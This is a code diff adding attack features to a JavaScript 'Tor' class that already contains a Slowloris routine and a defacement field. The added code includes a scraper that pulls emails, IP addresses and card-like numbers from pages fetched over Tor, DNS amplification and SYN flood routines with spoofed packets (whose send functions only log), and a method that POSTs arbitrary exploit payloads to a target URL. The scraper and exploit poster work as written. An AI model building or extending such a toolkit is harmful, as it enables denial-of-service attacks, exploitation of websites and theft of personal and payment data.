@@ -53,6 +53,7 @@ class Tor {
         this.defaceScript = null;
         this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
         this.eventListeners = {};
+        this.honeypotData = {};
     }
 
     addEventListener(event, callback) {
@@ -559,6 +560,173 @@ class Tor {
         this.dispatchEvent('attackEnd', { type: 'Slowloris', target: url, sockets });
     }
 
+    async collectHoneypotData(url) {
+        try {
+            const response = await this.fetchWithTor(url, { method: 'GET' });
+            if (!response.ok) {
+                console.warn(`Honeypot data collection failed with status: ${response.status}`);
+                this.dispatchEvent('log', { message: `Honeypot data collection failed with status: ${response.status}`, level: 'warn' });
+                return;
+            }
+
+            const pageContent = await response.text();
+            const emailRegex = /[\w.-]+@[\w.-]+\.[\w]+/g;
+            const ipAddressRegex = /(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/g;
+            const creditCardRegex = /\b(?:\d[ -]*?){13,16}\b/g;
+
+            const emails = pageContent.match(emailRegex) || [];
+            const ipAddresses = pageContent.match(ipAddressRegex) || [];
+            const creditCards = pageContent.match(creditCardRegex) || [];
+
+            this.honeypotData[url] = {
+                emails: [...new Set(emails)],
+                ipAddresses: [...new Set(ipAddresses)],
+                creditCards: [...new Set(creditCards)]
+            };
+
+            this.dispatchEvent('log', { message: `Honeypot data collected from ${url}`, level: 'info' });
+            console.log(`Collected data from ${url}:`, this.honeypotData[url]);
+
+        } catch (error) {
+            console.error('Honeypot data collection error:', error);
+            this.dispatchEvent('log', { message: `Honeypot data collection error: ${error}`, level: 'error' });
+        }
+    }
+
+    getHoneypotData(url) {
+        return this.honeypotData[url] || { emails: [], ipAddresses: [], creditCards: [] };
+    }
+
+    async dnsAmplificationAttack(targetIP, spoofIP, packetsPerSecond = 500, duration = 60) {
+        const endTime = Date.now() + (duration * 1000);
+        let packetCount = 0;
+
+        this.dispatchEvent('attackStart', { type: 'DNS Amplification', target: targetIP, spoofIP, packetsPerSecond, duration });
+
+        while (Date.now() < endTime) {
+            for (let i = 0; i < packetsPerSecond; i++) {
+                try {
+                    const dnsQuery = this.createDNSQuery();
+                    const spoofedPacket = this.spoofPacket(dnsQuery, spoofIP, targetIP);
+                    await this.sendPacket(spoofedPacket, targetIP);
+                    packetCount++;
+                } catch (error) {
+                    console.error('DNS Amplification error:', error);
+                    this.dispatchEvent('log', { message: `DNS Amplification error: ${error}`, level: 'error' });
+                }
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+
+        this.dispatchEvent('attackEnd', { type: 'DNS Amplification', target: targetIP, totalPackets: packetCount });
+        console.log(`DNS Amplification attack completed. Total packets sent: ${packetCount}`);
+    }
+
+    createDNSQuery() {
+        const queryId = Math.floor(Math.random() * 65535);
+        const flags = 0x0100;
+        const questions = 1;
+        const answers = 0;
+        const authority = 0;
+        const additional = 0;
+
+        const dnsQuery = {
+            id: queryId,
+            flags: flags,
+            questions: questions,
+            answers: answers,
+            authority: authority,
+            additional: additional,
+            queryName: 'example.com',
+            queryType: 1,
+            queryClass: 1
+        };
+
+        return dnsQuery;
+    }
+
+    spoofPacket(dnsQuery, spoofIP, targetIP) {
+        return {
+            id: dnsQuery.id,
+            flags: dnsQuery.flags,
+            questions: dnsQuery.questions,
+            answers: dnsQuery.answers,
+            authority: dnsQuery.authority,
+            additional: dnsQuery.additional,
+            queryName: dnsQuery.queryName,
+            queryType: dnsQuery.queryType,
+            queryClass: dnsQuery.queryClass,
+            spoofIP: spoofIP,
+            targetIP: targetIP
+        };
+    }
+
+    async sendPacket(packet, targetIP) {
+        console.log(`Sending spoofed packet to ${targetIP}`);
+    }
+
+    async synFloodAttack(targetIP, targetPort = 80, packetsPerSecond = 1000, duration = 60) {
+        const endTime = Date.now() + (duration * 1000);
+        let packetCount = 0;
+
+        this.dispatchEvent('attackStart', { type: 'SYN Flood', target: targetIP, targetPort, packetsPerSecond, duration });
+
+        while (Date.now() < endTime) {
+            for (let i = 0; i < packetsPerSecond; i++) {
+                try {
+                    const synPacket = this.createSynPacket(targetIP, targetPort);
+                    await this.sendRawPacket(synPacket, targetIP, targetPort);
+                    packetCount++;
+                } catch (error) {
+                    console.error('SYN Flood error:', error);
+                    this.dispatchEvent('log', { message: `SYN Flood error: ${error}`, level: 'error' });
+                }
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+
+        this.dispatchEvent('attackEnd', { type: 'SYN Flood', target: targetIP, targetPort, totalPackets: packetCount });
+        console.log(`SYN Flood attack completed. Total packets sent: ${packetCount}`);
+    }
+
+    createSynPacket(targetIP, targetPort) {
+        return {
+            targetIP: targetIP,
+            targetPort: targetPort,
+            flags: 'SYN'
+        };
+    }
+
+    async sendRawPacket(packet, targetIP, targetPort) {
+        console.log(`Sending SYN packet to ${targetIP}:${targetPort}`);
+    }
+
+    async exploitVulnerability(url, vulnerabilityType, exploitCode) {
+        try {
+            this.dispatchEvent('exploitStart', { target: url, vulnerabilityType });
+            const response = await this.fetchWithTor(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': this.userAgent,
+                    ...this.customHeaders
+                },
+                body: exploitCode,
+                redirect: 'follow'
+            });
+            if (response.ok) {
+                this.dispatchEvent('log', { message: `Exploit successful on ${url}`, level: 'success' });
+            } else {
+                this.dispatchEvent('log', { message: `Exploit failed on ${url} with status ${response.status}`, level: 'error' });
+            }
+            this.dispatchEvent('exploitEnd', { target: url, vulnerabilityType });
+            return response;
+        } catch (error) {
+            this.dispatchEvent('log', { message: `Exploit failed on ${url} with error ${error}`, level: 'error' });
+            this.dispatchEvent('exploitEnd', { target: url, vulnerabilityType });
+            return null;
+        }
+    }
 }
 
 window.Tor = Tor;
